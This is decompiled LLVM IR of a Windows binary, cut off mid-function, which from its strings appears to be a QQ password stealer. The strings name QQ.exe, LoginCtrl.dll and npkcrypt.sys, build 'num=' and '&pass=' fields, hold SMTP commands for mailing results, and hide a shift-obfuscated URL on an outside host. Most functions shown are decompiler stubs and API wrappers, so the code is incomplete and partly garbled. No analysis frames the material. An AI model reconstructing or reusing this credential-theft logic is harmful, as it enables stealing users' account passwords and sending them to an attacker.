source_filename = "test"
target datalayout = "e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_EXCEPTION_RECORD = type { i32, i32, %_EXCEPTION_RECORD*, i32*, i32, [1 x i32] }
%_EXCEPTION_POINTERS = type { %_EXCEPTION_RECORD*, %_CONTEXT* }
%_CONTEXT = type { i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i16, i16, i16, i16, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, [26 x %_M128A], i32, i32, i32, i32, i32, i32 }
%_M128A = type { i32, i64 }
%_OVERLAPPED = type { i32, i32, i32, i32* }
%_STARTUPINFOA = type { i32, i8*, i8*, i8*, i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i8*, i32*, i32*, i32* }
%_LARGE_INTEGER = type { i64 }
%_RTL_CRITICAL_SECTION = type { %_RTL_CRITICAL_SECTION_DEBUG*, i32, i32, i32*, i32*, i32 }
%_RTL_CRITICAL_SECTION_DEBUG = type { i16, i16, %_RTL_CRITICAL_SECTION*, %_LIST_ENTRY, i32, i32, i32, i16, i16 }
%_LIST_ENTRY = type { %_LIST_ENTRY*, %_LIST_ENTRY* }
%_SECURITY_ATTRIBUTES = type { i32, i32*, i1 }
%tagMSG = type { i32*, i32, i32, i32, i32, %tagPOINT }
%tagPOINT = type { i32, i32 }
%sockaddr = type { i16, [14 x i8] }
%in_addr = type { i32 }
%hostent = type { i8*, i8**, i16, i16, i8** }
%WSAData = type { i16, i16, i16, i16, i8*, [1 x i8], [1 x i8] }

@global_var_408000 = local_unnamed_addr global i32 0
@global_var_408094 = local_unnamed_addr global i32 0
@global_var_409658 = local_unnamed_addr global i32 0
@global_var_409660 = local_unnamed_addr global i32 0
@global_var_409664 = local_unnamed_addr global i32 0
@global_var_409678 = local_unnamed_addr global i32 0
@global_var_409674 = local_unnamed_addr global i32 0
@global_var_409670 = local_unnamed_addr global i32 0
@global_var_40966c = global i32 0
@global_var_409668 = global i32 0
@global_var_4080bc = global i32 4212308
@global_var_40967c = local_unnamed_addr global i32 0
@global_var_409680 = local_unnamed_addr global i32 0
@global_var_409684 = local_unnamed_addr global i32 0
@global_var_409688 = local_unnamed_addr global i32 0
@global_var_40968c = local_unnamed_addr global i32 0
@global_var_409690 = local_unnamed_addr global i32 0
@global_var_409694 = local_unnamed_addr global i32 0
@global_var_409698 = local_unnamed_addr global i32 0
@global_var_404c24 = local_unnamed_addr constant i32 43
@global_var_404c3c = constant i32 37
@global_var_404cc4 = local_unnamed_addr constant i32 63
@global_var_40969c = local_unnamed_addr global i32 0
@global_var_404d88 = local_unnamed_addr constant [3 x i8] c"mz\00"
@global_var_404d8c = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_4080f8 = global i32 1
@global_var_404da8 = constant [10 x i8] c"First Run\00"
@global_var_404e64 = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_404e80 = constant [10 x i8] c"First Run\00"
@global_var_408138 = external local_unnamed_addr global i32
@global_var_4080c0 = local_unnamed_addr global i32 0
@global_var_4080e8 = global i32 4213024
@global_var_4080f4 = local_unnamed_addr global i32 66
@global_var_4080cc = local_unnamed_addr global i32 4212320
@global_var_4080c8 = local_unnamed_addr global i32 0
@global_var_4080e4 = global i32 4212956
@global_var_4080dc = local_unnamed_addr global i32 4212820
@global_var_4080f0 = global i32 4230401
@global_var_404f2c = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_404f3c = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_4096a0 = local_unnamed_addr global i32 0
@global_var_40813c = external local_unnamed_addr global i32
@global_var_405200 = constant [9 x i8] c"ComboBox\00"
@global_var_408140 = external local_unnamed_addr global i32
@global_var_40812c = external local_unnamed_addr global i32
@global_var_4080c4 = local_unnamed_addr global i32 0
@global_var_4080d8 = global i32 4212752
@global_var_4096a8 = local_unnamed_addr global i32 0
@global_var_4096ac = local_unnamed_addr global i32 0
@global_var_4096a4 = local_unnamed_addr global i32 0
@global_var_4080fc = local_unnamed_addr global i32 4215632
@B64EncodeTable_at_405350 = constant [64 x i8] c"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
@global_var_405a28 = constant [6 x i8] c"HELO \00"
@global_var_405a38 = constant [3 x i8] c"\0D\0A\00"
@global_var_405a44 = local_unnamed_addr constant [13 x i8] c"AUTH LOGIN\0D\0A\00"
@global_var_405a5c = constant [13 x i8] c"MAIL FROM: <\00"
@global_var_405a74 = constant i32 62
@global_var_405a80 = constant [11 x i8] c"RCPT TO: <\00"
@global_var_405a94 = local_unnamed_addr constant [7 x i8] c"DATA\0D\0A\00"
@global_var_405aa4 = constant [8 x i8] c"From: <\00"
@global_var_405ab4 = constant [6 x i8] c"To: <\00"
@global_var_405ac4 = constant [10 x i8] c"Subject: \00"
@global_var_405ad8 = constant i32 46
@global_var_4096b4 = local_unnamed_addr global i32 0
@global_var_405ae4 = local_unnamed_addr constant [7 x i8] c"QUIT\0D\0A\00"
@global_var_4096b0 = local_unnamed_addr global i32 0
@global_var_405b2e = local_unnamed_addr constant i32 763609949
@global_var_4096b8 = local_unnamed_addr global i32 0
@global_var_4096bc = local_unnamed_addr global i32 0
@global_var_405eb0 = constant [7 x i8] c"#32770\00"
@global_var_405ec0 = local_unnamed_addr constant [7 x i8] c"Button\00"
@global_var_408100 = local_unnamed_addr global i32 0
@global_var_408104 = local_unnamed_addr global i32 0
@global_var_406004 = local_unnamed_addr constant [33 x i8] c"http://jump.qq.com/clienturl_157\00"
@global_var_406028 = local_unnamed_addr constant [33 x i8] c"http://jump.qq.com/clienturl_156\00"
@global_var_408108 = local_unnamed_addr global i32 0
@global_var_4060bc = constant [11 x i8] c"user32.dll\00"
@global_var_4060c8 = constant [11 x i8] c"LoadImageA\00"
@global_var_4060d4 = local_unnamed_addr constant [14 x i8] c"LoginCtrl.DLL\00"
@global_var_405b78 = local_unnamed_addr constant i32 4217796
@global_var_405bc4 = local_unnamed_addr constant i32 1867011080
@global_var_4060e4 = constant [12 x i8] c"LoadStringA\00"
@global_var_4060f0 = local_unnamed_addr constant [10 x i8] c"MFC42.DLL\00"
@global_var_4060fc = constant [12 x i8] c"shell32.dll\00"
@global_var_406108 = constant [14 x i8] c"ShellExecuteA\00"
@global_var_406118 = local_unnamed_addr constant [16 x i8] c"QQHELPERDLL.DLL\00"
@global_var_408101 = local_unnamed_addr global i32 0
@global_var_4096c0 = local_unnamed_addr global i32 0
@global_var_4096c8 = local_unnamed_addr global i32 0
@global_var_406180 = local_unnamed_addr constant i32 4219268
@global_var_406184 = local_unnamed_addr constant i32 841875985
@global_var_4096c4 = local_unnamed_addr global i32 0
@global_var_40810c = local_unnamed_addr global i32 4219560
@global_var_408128 = local_unnamed_addr global i32* @global_var_4080bc
@global_var_4096cc = local_unnamed_addr global i32 0
@global_var_408154 = external local_unnamed_addr global i32
@global_var_4064a4 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_408110 = local_unnamed_addr global i32 0
@global_var_408148 = external local_unnamed_addr global i32
@global_var_408114 = local_unnamed_addr global i32 0
@global_var_4096d0 = local_unnamed_addr global i32 0
@global_var_4080ec = global i32 4213092
@global_var_408124 = local_unnamed_addr global i32* @global_var_4080ec
@global_var_4067bc = constant [6 x i8] c"Down(\00"
@global_var_4067cc = constant i32 41
@global_var_4067d8 = local_unnamed_addr constant [4 x i8] c"c:\5C\00"
@global_var_4067dc = constant [5 x i8] c"Open\00"
@global_var_4096d4 = global i32 0
@global_var_406aa0 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_4080e0 = local_unnamed_addr global i32 4212888
@global_var_406aac = constant i32 47
@global_var_406aec = local_unnamed_addr constant i32 64
@global_var_408158 = local_unnamed_addr global i32* @global_var_4080e4
@global_var_408144 = local_unnamed_addr global i32* @global_var_4080e8
@global_var_406af8 = constant [5 x i8] c"num=\00"
@global_var_406b08 = constant [7 x i8] c"&pass=\00"
@global_var_408134 = local_unnamed_addr global i32* @global_var_4080d8
@global_var_406b18 = local_unnamed_addr constant [35 x i8] c"iuuq;00uftu=43992=dpn0uftu0ofx=btq\00"
@global_var_406bf0 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_406c00 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_406d10 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_406d20 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_408130 = local_unnamed_addr global i32* @global_var_409668
@global_var_406d28 = local_unnamed_addr constant [13 x i8] c"xr, wo ai ni\00"
@global_var_4096d8 = local_unnamed_addr global i32 0
@global_var_4096e0 = local_unnamed_addr global i32 0
@global_var_408150 = local_unnamed_addr global i32* @global_var_40966c
@global_var_406f9c = local_unnamed_addr constant [11 x i8] c"joipor.obj\00"
@global_var_406fb0 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_406fbc = local_unnamed_addr constant i32 47
@global_var_406da8 = local_unnamed_addr constant i32 4222380
@global_var_406dac = local_unnamed_addr constant i32 841875985
@global_var_4070dc = local_unnamed_addr constant [11 x i8] c"joipor.obj\00"
@global_var_4070f0 = constant i32 47
@global_var_4070fc = constant [3 x i8] c"\0D\0A\00"
@global_var_4096dc = local_unnamed_addr global i32 0
@global_var_4076d4 = local_unnamed_addr constant [7 x i8] c"#32770\00"
@global_var_407780 = local_unnamed_addr constant [5 x i8] c"Edit\00"
@global_var_407908 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_408160 = local_unnamed_addr global i32* @global_var_4080f0
@global_var_407914 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_408120 = local_unnamed_addr global i32* @global_var_4096d4
@global_var_4096e8 = local_unnamed_addr global i32 0
@global_var_4096e4 = local_unnamed_addr global i32 0
@global_var_407a60 = local_unnamed_addr constant i32 27
@global_var_4097f8 = local_unnamed_addr global i32 0
@global_var_4097fc = local_unnamed_addr global i32 0
@global_var_409800 = local_unnamed_addr global i32 0
@global_var_407df8 = local_unnamed_addr constant [7 x i8] c"QQ.exe\00"
@global_var_4097f4 = local_unnamed_addr global i32 0
@global_var_407e08 = local_unnamed_addr constant [13 x i8] c"npkcrypt.sys\00"
@global_var_407e20 = local_unnamed_addr constant [14 x i8] c"LoginCtrl.dll\00"
@global_var_408118 = local_unnamed_addr global i32 0
@global_var_407e38 = local_unnamed_addr constant [13 x i8] c"Fyqmpsfs=fyf\00"
@global_var_407e48 = constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_407e58 = constant [8 x i8] c"ListBox\00"
@global_var_409804 = global i32 0
@global_var_407e68 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_409654 = local_unnamed_addr global i32 0
@0 = external global i32
@global_var_4095ac = local_unnamed_addr global i8 0
@1 = internal constant [12 x i8] c"aixiaran\10H@\00"
@global_var_4080d0 = global i8* getelementptr inbounds ([12 x i8], [12 x i8]* @1, i32 0, i32 0)
@global_var_409650 = local_unnamed_addr global i32 (i32, i32, i32)* null
@global_var_4096ec = external global i8*

declare i32 @unknown_4e08() local_unnamed_addr

declare i32 @unknown_4ee0() local_unnamed_addr

define i32* @GetStdHandle.19(i32 %nStdHandle) local_unnamed_addr {
dec_label_pc_401060:
  %0 = call i32* @GetStdHandle(i32 %nStdHandle), !insn.addr !0
  ret i32* %0, !insn.addr !0
}

define void @RaiseException.40(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments) local_unnamed_addr {
dec_label_pc_401068:
  call void @RaiseException(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments), !insn.addr !1
  ret void, !insn.addr !1
}

define void @RtlUnwind.41(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue) local_unnamed_addr {
dec_label_pc_401070:
  call void @RtlUnwind(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue), !insn.addr !2
  ret void, !insn.addr !2
}

define i32 @UnhandledExceptionFilter.33(%_EXCEPTION_POINTERS* %ExceptionInfo) local_unnamed_addr {
dec_label_pc_401078:
  %0 = call i32 @UnhandledExceptionFilter(%_EXCEPTION_POINTERS* %ExceptionInfo), !insn.addr !3
  ret i32 %0, !insn.addr !3
}

define i1 @WriteFile.20(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped) local_unnamed_addr {
dec_label_pc_401080:
  %0 = call i1 @WriteFile(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped), !insn.addr !4
  ret i1 %0, !insn.addr !4
}

define void @ExitProcess.18(i32 %uExitCode) local_unnamed_addr {
dec_label_pc_401088:
  call void @ExitProcess(i32 %uExitCode), !insn.addr !5
  ret void, !insn.addr !5
}

define i32 @MessageBox(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType) local_unnamed_addr {
dec_label_pc_401090:
  %0 = call i32 @MessageBoxA(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType), !insn.addr !6
  ret i32 %0, !insn.addr !6
}

define i1 @FreeLibrary.17(i32* %hLibModule) local_unnamed_addr {
dec_label_pc_401098:
  %0 = call i1 @FreeLibrary(i32* %hLibModule), !insn.addr !7
  ret i1 %0, !insn.addr !7
}

define i8* @GetCommandLine() local_unnamed_addr {
dec_label_pc_4010a0:
  %0 = call i8* @GetCommandLineA(), !insn.addr !8
  ret i8* %0, !insn.addr !8
}

define i32 @GetLocaleInfo(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData) local_unnamed_addr {
dec_label_pc_4010a8:
  %0 = call i32 @GetLocaleInfoA(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData), !insn.addr !9
  ret i32 %0, !insn.addr !9
}

define void @GetStartupInfo(%_STARTUPINFOA* %lpStartupInfo) local_unnamed_addr {
dec_label_pc_4010b0:
  call void @GetStartupInfoA(%_STARTUPINFOA* %lpStartupInfo), !insn.addr !10
  ret void, !insn.addr !10
}

define i32 @GetThreadLocale.35() local_unnamed_addr {
dec_label_pc_4010b8:
  %0 = call i32 @GetThreadLocale(), !insn.addr !11
  ret i32 %0, !insn.addr !11
}

define i32 @RegCloseKey.32(i32* %hKey) local_unnamed_addr {
dec_label_pc_4010c0:
  %0 = call i32 @RegCloseKey(i32* %hKey), !insn.addr !12
  ret i32 %0, !insn.addr !12
}

define i32 @RegOpenKeyEx(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult) local_unnamed_addr {
dec_label_pc_4010c8:
  %0 = call i32 @RegOpenKeyExA(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult), !insn.addr !13
  ret i32 %0, !insn.addr !13
}

define i32 @RegQueryValueEx(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData) local_unnamed_addr {
dec_label_pc_4010d0:
  %0 = call i32 @RegQueryValueExA(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData), !insn.addr !14
  ret i32 %0, !insn.addr !14
}

define i32 @SysReAllocStringLen.25(i16** %pbstr, i16* %psz, i32 %len) local_unnamed_addr {
dec_label_pc_4010d8:
  %0 = call i32 @SysReAllocStringLen(i16** %pbstr, i16* %psz, i32 %len), !insn.addr !15
  ret i32 %0, !insn.addr !15
}

define void @SysFreeString.26(i16* %bstrString) local_unnamed_addr {
dec_label_pc_4010e0:
  call void @SysFreeString(i16* %bstrString), !insn.addr !16
  ret void, !insn.addr !16
}

define i32 @GetCurrentThreadId.36() local_unnamed_addr {
dec_label_pc_4010e8:
  %0 = call i32 @GetCurrentThreadId(), !insn.addr !17
  ret i32 %0, !insn.addr !17
}

define i32 @GetVersion.34() local_unnamed_addr {
dec_label_pc_4010f0:
  %0 = call i32 @GetVersion(), !insn.addr !18
  ret i32 %0, !insn.addr !18
}

define i1 @QueryPerformanceCounter.29(%_LARGE_INTEGER* %lpPerformanceCount) local_unnamed_addr {
dec_label_pc_4010f8:
  %0 = call i1 @QueryPerformanceCounter(%_LARGE_INTEGER* %lpPerformanceCount), !insn.addr !19
  ret i1 %0, !insn.addr !19
}

define i32 @GetTickCount.30() local_unnamed_addr {
dec_label_pc_401100:
  %0 = call i32 @GetTickCount(), !insn.addr !20
  ret i32 %0, !insn.addr !20
}

define i32* @LocalAlloc.15(i32 %uFlags, i32 %uBytes) local_unnamed_addr {
dec_label_pc_40112c:
  %0 = call i32* @LocalAlloc(i32 %uFlags, i32 %uBytes), !insn.addr !21
  ret i32* %0, !insn.addr !21
}

define i32* @LocalFree.27(i32* %hMem) local_unnamed_addr {
dec_label_pc_401134:
  %0 = call i32* @LocalFree(i32* %hMem), !insn.addr !22
  ret i32* %0, !insn.addr !22
}

define i32* @VirtualAlloc.21(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect) local_unnamed_addr {
dec_label_pc_40113c:
  %0 = call i32* @VirtualAlloc(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect), !insn.addr !23
  ret i32* %0, !insn.addr !23
}

define i1 @VirtualFree.16(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType) local_unnamed_addr {
dec_label_pc_401144:
  %0 = call i1 @VirtualFree(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType), !insn.addr !24
  ret i1 %0, !insn.addr !24
}

define void @InitializeCriticalSection.14(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40114c:
  call void @InitializeCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !25
  ret void, !insn.addr !25
}

define void @EnterCriticalSection.12(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401154:
  call void @EnterCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !26
  ret void, !insn.addr !26
}

define void @LeaveCriticalSection.13(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40115c:
  call void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !27
  ret void, !insn.addr !27
}

define void @DeleteCriticalSection.28(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401164:
  call void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !28
  ret void, !insn.addr !28
}

define i32 @InitAllocator.42() local_unnamed_addr {
dec_label_pc_4018ae:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !29
  ret i32 %0, !insn.addr !29
}

define i32 @function_4018b3() local_unnamed_addr {
dec_label_pc_4018b3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !30
}

define i32 @function_4018b5(i32 %arg1) local_unnamed_addr {
dec_label_pc_4018b5:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i8, i8* @global_var_4095ac, align 1, !insn.addr !31
  %2 = zext i8 %1 to i32, !insn.addr !31
  %3 = and i32 %0, -256, !insn.addr !31
  %4 = or i32 %3, %2, !insn.addr !31
  ret i32 %4, !insn.addr !32
}

define i32 @SysGetMem.43() local_unnamed_addr {
dec_label_pc_402060:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !33
  ret i32 %0, !insn.addr !33
}

define i32 @function_402065() local_unnamed_addr {
dec_label_pc_402065:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !34
}

define i32 @function_402067(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_402067:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !35
  %2 = inttoptr i32 %1 to i32*, !insn.addr !35
  %3 = load i32, i32* %2, align 4, !insn.addr !35
  ret i32 %3, !insn.addr !36
}

define i32 @SysFreeMem.44() local_unnamed_addr {
dec_label_pc_402206:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !37
  ret i32 %0, !insn.addr !37
}

define i32 @function_40220b() local_unnamed_addr {
dec_label_pc_40220b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !38
}

define i32 @function_40220d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_40220d:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !39
  %2 = inttoptr i32 %1 to i32*, !insn.addr !39
  %3 = load i32, i32* %2, align 4, !insn.addr !39
  ret i32 %3, !insn.addr !40
}

define i32 @SysReallocMem.45() local_unnamed_addr {
dec_label_pc_4024a5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !41
  ret i32 %0, !insn.addr !41
}

define i32 @function_4024aa() local_unnamed_addr {
dec_label_pc_4024aa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !42
}

define i32 @function_4024ac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4024ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !43
  %2 = inttoptr i32 %1 to i32*, !insn.addr !43
  %3 = load i32, i32* %2, align 4, !insn.addr !43
  ret i32 %3, !insn.addr !44
}

define i32 @function_402553() local_unnamed_addr {
dec_label_pc_402553:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !45
}

define i32 @function_40259b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40259b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !46
}

define i32 @function_4025ab() local_unnamed_addr {
dec_label_pc_4025ab:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !47
}

declare i32 @Move() local_unnamed_addr

declare i32 @"@PStrNCpy"() local_unnamed_addr

declare i32 @"@FillChar"() local_unnamed_addr

declare i32 @"@Str0Long"(i32, i32) local_unnamed_addr

define i32 @GetKeyboardType.31(i32 %nTypeFlag) local_unnamed_addr {
dec_label_pc_4028b0:
  %0 = call i32 @GetKeyboardType(i32 %nTypeFlag), !insn.addr !48
  ret i32 %0, !insn.addr !48
}

define i32 @function_402ab4() local_unnamed_addr {
dec_label_pc_402ab4:
  ret i32 -2147418113, !insn.addr !49
}

define i32 @function_402abc() local_unnamed_addr {
dec_label_pc_402abc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !50
}

define i32 @function_402ac0() local_unnamed_addr {
dec_label_pc_402ac0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !51
}

define i32 @function_402ac4() local_unnamed_addr {
dec_label_pc_402ac4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !52
}

define i32 @function_402aee() local_unnamed_addr {
dec_label_pc_402aee:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !53
}

declare i32 @"@ClassCreate"(i32, i32, i32, i32, i32) local_unnamed_addr

define i32 @"@ClassCreate.46"() local_unnamed_addr {
dec_label_pc_402b19:
  %0 = call i32 @"@HandleAnyException"(), !insn.addr !54
  ret i32 %0, !insn.addr !54
}

define i32 @function_402b1e(i32 %arg1) local_unnamed_addr {
dec_label_pc_402b1e:
  %0 = add i32 %arg1, 12, !insn.addr !55
  %1 = inttoptr i32 %0 to i32*, !insn.addr !55
  %2 = load i32, i32* %1, align 4, !insn.addr !55
  %3 = icmp eq i32 %2, 0, !insn.addr !56
  br i1 %3, label %dec_label_pc_402b37, label %dec_label_pc_402b29, !insn.addr !57

dec_label_pc_402b29:                              ; preds = %dec_label_pc_402b1e
  %4 = call i32 @"@ClassDestroy"(), !insn.addr !58
  br label %dec_label_pc_402b37, !insn.addr !58

dec_label_pc_402b37:                              ; preds = %dec_label_pc_402b29, %dec_label_pc_402b1e
  %5 = call i32 @"@RaiseAgain"(), !insn.addr !59
  ret i32 %5, !insn.addr !60
}

declare i32 @"@ClassDestroy"() local_unnamed_addr

define i32 @function_402b48() local_unnamed_addr {
dec_label_pc_402b48:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !61
}

declare i32 @"@BeforeDestruction"(i32, i32) local_unnamed_addr

declare i32 @"@HandleAnyException"() local_unnamed_addr

declare i32 @"@HandleFinally"() local_unnamed_addr

declare i32 @"@RaiseAgain"() local_unnamed_addr

define i32 @function_402e3f() local_unnamed_addr {
dec_label_pc_402e3f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !62
}

define i32 @function_402e55() local_unnamed_addr {
dec_label_pc_402e55:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !63
}

define i32 @function_402ef4(i32 %arg1) local_unnamed_addr {
dec_label_pc_402ef4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !64
}

define i32 @function_403167() local_unnamed_addr {
dec_label_pc_403167:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !65
}

define i32 @function_4031f1() local_unnamed_addr {
dec_label_pc_4031f1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !66
}

declare i32 @"@Halt0"() local_unnamed_addr

define i32 @function_403353(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_403353:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !67
}

define i32 @"@Halt"() local_unnamed_addr {
dec_label_pc_403358:
  %0 = call i32 @"@Halt0"(), !insn.addr !68
  unreachable, !insn.addr !68
}

define i32 @function_403362() local_unnamed_addr {
dec_label_pc_403362:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !69
}

define i32 @function_40336f() local_unnamed_addr {
dec_label_pc_40336f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !70
}

declare i32 @"@LStrClr"() local_unnamed_addr

declare i32 @"@LStrArrayClr"() local_unnamed_addr

declare i32 @"@LStrAsg"() local_unnamed_addr

declare i32 @"@LStrFromChar"() local_unnamed_addr

declare i32 @"@LStrFromPChar"() local_unnamed_addr

define i32 @function_4034a0() local_unnamed_addr {
dec_label_pc_4034a0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !71
}

declare i32 @"@LStrFromString"() local_unnamed_addr

define i32 @function_4034ae() local_unnamed_addr {
dec_label_pc_4034ae:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !72
}

declare i32 @"@LStrFromArray"() local_unnamed_addr

define i32 @function_4034c7() local_unnamed_addr {
dec_label_pc_4034c7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !73
}

define i32 @function_4034c8() local_unnamed_addr {
dec_label_pc_4034c8:
  %eax.0.reg2mem = alloca i32, !insn.addr !74
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !74
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !75
  br i1 %1, label %dec_label_pc_4034cf, label %dec_label_pc_4034cc, !insn.addr !75

dec_label_pc_4034cc:                              ; preds = %dec_label_pc_4034c8
  %2 = add i32 %0, -4, !insn.addr !76
  %3 = inttoptr i32 %2 to i32*, !insn.addr !76
  %4 = load i32, i32* %3, align 4, !insn.addr !76
  store i32 %4, i32* %eax.0.reg2mem, !insn.addr !76
  br label %dec_label_pc_4034cf, !insn.addr !76

dec_label_pc_4034cf:                              ; preds = %dec_label_pc_4034cc, %dec_label_pc_4034c8
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !77
}

declare i32 @"@LStrCat"() local_unnamed_addr

declare i32 @"@LStrCat3"() local_unnamed_addr

define i32 @function_403587() local_unnamed_addr {
dec_label_pc_403587:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !78
}

declare i32 @"@LStrCatN"() local_unnamed_addr

define i32 @function_403611() local_unnamed_addr {
dec_label_pc_403611:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !79
}

declare i32 @"@LStrCmp"() local_unnamed_addr

define i32 @function_4036b8() local_unnamed_addr {
dec_label_pc_4036b8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !80
  br i1 %1, label %dec_label_pc_4036c6, label %dec_label_pc_4036bc, !insn.addr !81

dec_label_pc_4036bc:                              ; preds = %dec_label_pc_4036b8
  %2 = add i32 %0, -8, !insn.addr !82
  %3 = inttoptr i32 %2 to i32*, !insn.addr !82
  %4 = load i32, i32* %3, align 4, !insn.addr !82
  %5 = add i32 %4, 1, !insn.addr !83
  %6 = icmp slt i32 %5, 1, !insn.addr !84
  br i1 %6, label %dec_label_pc_4036c6, label %dec_label_pc_4036c2, !insn.addr !84

dec_label_pc_4036c2:                              ; preds = %dec_label_pc_4036bc
